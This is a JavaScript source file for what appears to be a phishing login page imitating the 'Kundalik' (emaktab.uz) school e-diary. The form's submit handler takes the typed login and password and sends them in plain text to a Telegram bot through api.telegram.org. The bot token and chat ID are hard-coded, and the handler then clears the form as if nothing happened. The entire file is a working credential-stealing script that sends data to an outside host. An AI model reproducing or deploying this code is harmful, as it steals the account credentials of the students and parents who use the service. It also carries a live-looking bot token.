// let doc = document

// fetch("https://api.emaktab.uz/v1/users/1000002293998")
//   .then(response => response.json()) // Декодируем ответ в формате json
//   .then(data => console.log(data)); // Выводим ответ в консоль

let FORM_DATA = document.querySelector(".login")
let ERROR_MESSAGE = "Some error occured!";
let SUCCES_MESSAGE = "Sent successfuly!";
let name = document.querySelector(".login__body__input_login")
let password = document.querySelector(".login__body__input_password")

FORM_DATA.addEventListener("submit", formSend)

async function formSend(event) {
  event.preventDefault()

  let TOKEN = "6992636433:AAG-wXhroe7NaAVSfvj1aS-YEYyVL2wHcqI"
  let CHAT_ID = "-1002052149040"
  let URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`

  let message = `
    <b>Kundalik User: </b>
    <b>Login: ${name.value}</b>
    <b>Password: ${password.value}</b>
  `
  let response = await fetch(URI_API, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "html"
    }),
  })

  let result = await response.json();

  if (result.ok) {
    showMessage(true)
    FORM_DATA.reset()
  } else {
    showMessage(false)
    console.log(result)
  }
}

function showMessage(isSuccess) {
  if (isSuccess) {
    console.log(SUCCES_MESSAGE)
  } else {
    console.log(ERROR_MESSAGE)
  }
}